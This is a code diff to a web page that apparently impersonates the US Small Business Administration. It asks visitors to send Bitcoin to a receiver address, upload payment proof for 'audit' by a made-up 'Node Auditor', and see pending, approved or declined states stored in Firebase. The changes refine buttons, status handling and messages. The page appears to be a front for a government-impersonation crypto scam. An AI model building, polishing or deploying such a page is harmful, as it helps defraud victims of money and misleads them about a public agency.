@@ -12,13 +12,14 @@
         body { background: #f1f5f9; font-family: 'Public Sans', sans-serif; color: #1e293b; margin: 0; -webkit-font-smoothing: antialiased; }
         
         .gov-banner { background: #001a3d; color: white; font-size: 8px; padding: 10px; text-align: center; font-weight: 800; text-transform: uppercase; border-bottom: 3px solid var(--sba-red); position: sticky; top: 0; z-index: 1001; }
-        .logo-frame { border: 2px solid var(--sba-blue); border-bottom-color: var(--sba-red); border-left-color: var(--sba-red); padding: 1px 6px; font-weight: 900; color: var(--sba-blue); font-size: 16px; line-height: 1; }
+        .logo-frame { border: 2px solid var(--sba-blue); border-bottom-color: var(--sba-red); border-left-color: var(--sba-red); padding: 1px 6px; font-weight: 900; color: var(--sba-blue); font-size: 16px; line-height: 1; cursor: pointer; }
         
         .glass-card { background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 46, 109, 0.05); border: 1px solid #e2e8f0; }
         .method-card { border: 1.5px solid #e2e8f0; border-radius: 12px; padding: 10px; cursor: pointer; transition: 0.2s; background: white; text-align: center; }
         .method-card.active { border-color: var(--sba-blue); background: #f0f7ff; border-width: 2px; }
 
-        .btn-fed { background: var(--sba-blue); color: white; font-weight: 900; text-transform: uppercase; border-bottom: 4px solid #001a3d; cursor: pointer; width: 100%; border-radius: 12px; font-size: 12px; }
+        .btn-fed { background: var(--sba-blue); color: white; font-weight: 900; text-transform: uppercase; border-bottom: 4px solid #001a3d; cursor: pointer; width: 100%; border-radius: 12px; font-size: 12px; transition: 0.1s; display: flex; align-items: center; justify-content: center; }
+        .btn-fed:active { transform: translateY(2px); border-bottom-width: 1px; }
         .btn-outline { border: 2px solid var(--sba-blue); color: var(--sba-blue); font-weight: 900; text-transform: uppercase; width: 100%; border-radius: 12px; font-size: 11px; }
 
         .radar-spin { animation: spin 2s linear infinite; }
@@ -76,12 +77,12 @@
                         <p id="methodLabel" class="text-[8px] font-black text-slate-500 uppercase">BTC Receiver</p>
                         <div class="flex items-center justify-between gap-2 mt-1">
                             <code id="walletAddr" class="text-[9px] font-bold text-amber-400 break-all">bc1qxy2kgdy6ynf36rly3rht60ks37u48zsh0ah345</code>
-                            <button onclick="copyAddr()" class="text-white bg-white/10 p-2 rounded-lg"><i class="fas fa-copy text-xs"></i></button>
+                            <button onclick="copyAddr()" class="text-white bg-white/10 p-2 rounded-lg active:scale-90"><i class="fas fa-copy text-xs"></i></button>
                         </div>
                     </div>
 
                     <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Transfer Receipt</label>
-                    <div onclick="document.getElementById('popFile').click()" class="mt-2 border-2 border-dashed border-slate-200 rounded-xl p-6 text-center bg-slate-50 relative overflow-hidden mb-6">
+                    <div onclick="document.getElementById('popFile').click()" class="mt-2 border-2 border-dashed border-slate-200 rounded-xl p-6 text-center bg-slate-50 relative overflow-hidden mb-6 min-h-[120px] flex flex-col items-center justify-center">
                         <img id="popPreview" class="absolute inset-0 w-full h-full object-cover hidden z-10">
                         <div id="uploadUI">
                             <i class="fas fa-camera text-slate-300 text-2xl mb-1"></i>
@@ -90,7 +91,7 @@
                         <input type="file" id="popFile" class="hidden" accept="image/*" onchange="previewReceipt()">
                     </div>
 
-                    <button onclick="handleDeposit()" class="btn-fed h-12">Transmit for Audit</button>
+                    <button onclick="handleDeposit()" id="subBtn" class="btn-fed h-12">Transmit for Audit</button>
                 </div>
 
                 <div id="pendingView" class="hidden text-center py-6">
@@ -127,7 +128,7 @@
         </div>
 
         <div class="mt-6 flex items-center gap-4 bg-white p-3 rounded-2xl border border-l-4 border-gold">
-            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=80" class="w-10 h-10 rounded-xl grayscale">
+            <img src="https://i.pravatar.cc/150?u=sarah" class="w-10 h-10 rounded-xl grayscale">
             <div>
                 <p class="text-[10px] font-black uppercase text-slate-800">Sarah Miller</p>
                 <p class="text-[8px] font-bold text-sba-blue uppercase tracking-widest">Node Auditor assigned</p>
@@ -154,7 +155,9 @@
         window.resetNode = async () => {
             document.getElementById('globalLoader').style.display = 'flex';
             try {
-                await updateDoc(doc(db, "users", auth.currentUser.uid), { depositStatus: "IDLE" });
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { 
+                    depositStatus: "IDLE" 
+                });
             } catch (e) { console.error(e); }
         };
 
@@ -172,15 +175,15 @@
                 if(!d) return;
                 document.getElementById('globalLoader').style.display = 'none';
                 
-                const status = d.depositStatus || "NEW";
+                const status = d.depositStatus || "IDLE";
                 if(status === "PENDING") {
                     switchView('pendingView');
                     document.getElementById('pAmt').innerText = `$${Number(d.lastDepAmount || 0).toLocaleString()}`;
                 } else if(status === "SUCCESSFUL" || status === "APPROVED") {
                     switchView('successView');
-                } else if(status === "DECLINED" || status === "REJECTED") {
+                } else if(status === "FAILED" || status === "DECLINED") {
                     switchView('declinedView');
-                    document.getElementById('dReason').innerText = d.denialReason || "Invalid proof of payment or transaction not found on blockchain.";
+                    document.getElementById('dReason').innerText = d.depositDeclineReason || "Verification failed. Proof provided was invalid or unreadable.";
                 } else {
                     switchView('formView');
                 }
@@ -196,11 +199,11 @@
                 img.src = e.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
                     const MAX_WIDTH = 600;
-                    const scaleSize = MAX_WIDTH / img.width;
+                    const scale = MAX_WIDTH / img.width;
                     canvas.width = MAX_WIDTH;
-                    canvas.height = img.height * scaleSize;
+                    canvas.height = img.height * scale;
+                    const ctx = canvas.getContext('2d');
                     ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                     compressedImage = canvas.toDataURL('image/jpeg', 0.6);
                     document.getElementById('popPreview').src = compressedImage;
@@ -213,43 +216,48 @@
 
         window.handleDeposit = async () => {
             const amt = document.getElementById('depAmount').value;
+            const btn = document.getElementById('subBtn');
             if(!amt || !compressedImage) {
-                alert("Action required: Please enter amount and upload payment proof.");
+                alert("Please enter amount and upload payment proof.");
                 return;
             }
             
-            document.getElementById('globalLoader').style.display = 'flex';
-            try {
-                const depEntry = {
-                    type: "DEPOSIT",
-                    amount: Number(amt),
-                    method: selectedMethodName,
-                    status: "PENDING",
-                    proof: compressedImage,
-                    date: new Date().toLocaleString()
-                };
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> TRANSMITTING...';
 
-                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+            try {
+                const depositData = {
                     depositStatus: "PENDING",
                     lastDepAmount: Number(amt),
                     lastDepProof: compressedImage,
-                    ledger: arrayUnion(depEntry)
-                });
+                    ledger: arrayUnion({
+                        type: "DEPOSIT",
+                        amount: Number(amt),
+                        method: selectedMethodName,
+                        status: "PENDING",
+                        proof: compressedImage,
+                        date: new Date().toISOString()
+                    })
+                };
+
+                await updateDoc(doc(db, "users", auth.currentUser.uid), depositData);
                 
+                // Clear inputs for next time
                 document.getElementById('depAmount').value = "";
                 compressedImage = null;
                 document.getElementById('popPreview').classList.add('hidden');
                 document.getElementById('uploadUI').classList.remove('hidden');
             } catch (err) { 
-                alert("Audit link failed. Please check your network."); 
+                alert("Audit link failed."); 
+                btn.disabled = false;
+                btn.innerHTML = "Transmit for Audit";
             }
-            document.getElementById('globalLoader').style.display = 'none';
         };
 
         window.copyAddr = () => {
             const addr = document.getElementById('walletAddr').innerText;
             navigator.clipboard.writeText(addr).then(() => {
-                alert("Receiver address copied to clipboard.");
+                alert("Receiver address copied.");
             });
         };
     </script>
